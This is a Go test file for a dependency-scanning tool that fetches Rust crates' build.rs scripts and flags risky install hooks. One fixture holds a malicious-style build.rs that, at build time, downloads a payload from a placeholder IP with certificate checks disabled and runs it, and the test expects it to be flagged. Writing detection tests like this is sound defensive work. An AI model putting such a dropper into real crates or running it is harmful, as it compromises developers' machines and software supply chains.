package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"net/http"
	"path"
	"strings"
	"testing"
	"time"

	"ihbv.io/depsnort/internal/datasource"
	"ihbv.io/depsnort/internal/datasource/registry"
	"ihbv.io/depsnort/internal/graph"
)

// D-140: cargo install-surface analysis is local-only (vendor/ or CARGO_HOME),
// so a cold clone gets none (D-139). -cargo-fetch-source closes that by fetching
// build.rs for exactly the crates the extraction reported as source-unavailable.

func d140Crate(t *testing.T, nameVer string, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{
			Name: nameVer + "/" + name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// d140Doer records which crates were requested, so a test can assert on the
// SELECTION rather than only the outcome.
type d140Doer struct {
	versionsJSON string
	crates       map[string][]byte // "name-version" -> bytes
	asked        []string
}

func (d *d140Doer) Do(req *http.Request) (*http.Response, error) {
	ok := func(b []byte) *http.Response {
		return &http.Response{StatusCode: 200, Body: io.NopCloser(bytes.NewReader(b)), Header: make(http.Header)}
	}
	if strings.Contains(req.URL.Path, "/versions") {
		d.asked = append(d.asked, path.Base(path.Dir(req.URL.Path)))
		return ok([]byte(d.versionsJSON)), nil
	}
	if req.URL.Host == "static.crates.io" {
		base := strings.TrimSuffix(path.Base(req.URL.Path), ".crate")
		if c, found := d.crates[base]; found {
			return ok(c), nil
		}
	}
	return &http.Response{StatusCode: 404, Body: io.NopCloser(strings.NewReader("")), Header: make(http.Header)}, nil
}

func d140Client(t *testing.T, d registry.Doer) *registry.CrateSourceClient {
	t.Helper()
	return &registry.CrateSourceClient{
		HTTP:  d,
		Cache: datasource.NewCache(t.TempDir(), time.Hour),
		Now:   func() time.Time { return time.Unix(1, 0) },
	}
}

// TestD140FetchesOnlyUnavailableCargoNodes is the selection contract: crates
// already read from disk must NOT be re-fetched (their on-disk content is what
// the build uses, and a fetch could disagree with it), and non-cargo nodes are
// not this pass's business.
func TestD140FetchesOnlyUnavailableCargoNodes(t *testing.T) {
	g := graph.New()
	add := func(id, eco, name, ver string) {
		g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: eco, Name: name, Version: ver})
	}
	add("pkg:cargo/wanted@1.0.0", "cargo", "wanted", "1.0.0")
	add("pkg:cargo/vendored@1.0.0", "cargo", "vendored", "1.0.0") // on disk already
	add("pkg:npm/other@1.0.0", "npm", "other", "1.0.0")

	noBuild := d140Crate(t, "wanted-1.0.0", map[string]string{"Cargo.toml": "[package]\nname=\"wanted\"\n"})
	nbSum := sha256.Sum256(noBuild)
	d := &d140Doer{
		versionsJSON: `{"versions":[{"num":"1.0.0","yanked":false,"checksum":"` + hex.EncodeToString(nbSum[:]) + `"}]}`,
		crates:       map[string][]byte{"wanted-1.0.0": noBuild},
	}
	_, examined := enrichCargoBuildRS(g, d140Client(t, d), map[string]bool{
		"pkg:cargo/wanted@1.0.0": true,
		"pkg:npm/other@1.0.0":    true, // even if present, not a cargo node
	})

	if len(d.asked) != 1 || d.asked[0] != "wanted" {
		t.Errorf("expected exactly one fetch, for \"wanted\"; got %v", d.asked)
	}
	if !examined["pkg:cargo/wanted@1.0.0"] {
		t.Error("a crate with no build.rs is still examined — the question was answered")
	}
	if examined["pkg:cargo/vendored@1.0.0"] {
		t.Error("must not touch a crate whose source was already on disk")
	}
}

// TestD140FetchedBuildRSReachesTheGraph is the whole point: a fetched build.rs
// must land as an install-surface hook so the VC-002 checks see it exactly as
// they would a vendored one. Uses an IOC-neutered reproduction of the
// arrayref/proc-macro1 shape (RFC 5737 placeholder).
func TestD140FetchedBuildRSReachesTheGraph(t *testing.T) {
	crate := d140Crate(t, "arrayref-0.3.7", map[string]string{
		"Cargo.toml": "[package]\nname=\"arrayref\"\n",
		"build.rs": `use std::process::Command;
fn main() {
    let c = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let b = c.get("https://203.0.113.10/payload").send().unwrap().bytes().unwrap();
    let dest = std::env::var("OUT_DIR").unwrap() + "/stage2";
    std::fs::write(&dest, &b).unwrap();
    Command::new(&dest).status().unwrap();
}`,
	})
	sum := sha256.Sum256(crate)

	g := graph.New()
	id := "pkg:cargo/arrayref@0.3.7"
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: "cargo", Name: "arrayref", Version: "0.3.7"})

	d := &d140Doer{
		versionsJSON: `{"versions":[{"num":"0.3.7","yanked":false,"checksum":"` + hex.EncodeToString(sum[:]) + `"}]}`,
		crates:       map[string][]byte{"arrayref-0.3.7": crate},
	}
	cov, examined := enrichCargoBuildRS(g, d140Client(t, d), map[string]bool{id: true})

	if !examined[id] {
		t.Fatal("expected the crate to be marked examined")
	}
	if cov.Stats.Queried != 1 || cov.Stats.Gaps != 0 {
		t.Errorf("coverage stats = %+v, want queried 1 gaps 0", cov.Stats)
	}
	var hook *graph.Node
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == id {
			hook = n
		}
	}
	if hook == nil {
		t.Fatal("fetched build.rs produced no install-surface hook")
	}
	// The OPU-39 markers must be present on the fetched content, same as vendored.
	// Capabilities are stored as individual cap.<name> attributes.
	for _, want := range []string{"cap.cradle", "cap.obfuscation", "cap.exec"} {
		if hook.Attr[want] != "true" {
			t.Errorf("expected %s=true on the fetched hook, attrs: %v", want, hook.Attr)
		}
	}
	if g.Get(id).Attr["cargo.build_rs_source"] != "fetched" {
		t.Error("node should record that its build.rs came from a fetch, not disk")
	}
}

// A fetch error leaves the crate unexamined, so its source-unavailable gap
// correctly survives into the coverage report.
func TestD140FetchErrorLeavesGapStanding(t *testing.T) {
	crate := d140Crate(t, "bad-1.0.0", map[string]string{"build.rs": "fn main(){}"})
	g := graph.New()
	id := "pkg:cargo/bad@1.0.0"
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: "cargo", Name: "bad", Version: "1.0.0"})

	d := &d140Doer{
		versionsJSON: `{"versions":[{"num":"1.0.0","yanked":false,"checksum":"deadbeef"}]}`, // mismatch
		crates:       map[string][]byte{"bad-1.0.0": crate},
	}
	cov, examined := enrichCargoBuildRS(g, d140Client(t, d), map[string]bool{id: true})
	if examined[id] {
		t.Error("a failed fetch must NOT clear the source-unavailable gap")
	}
	if cov.Stats.Gaps != 1 || cov.Error == "" {
		t.Errorf("expected the failure recorded as a gap, got %+v err=%q", cov.Stats, cov.Error)
	}
}
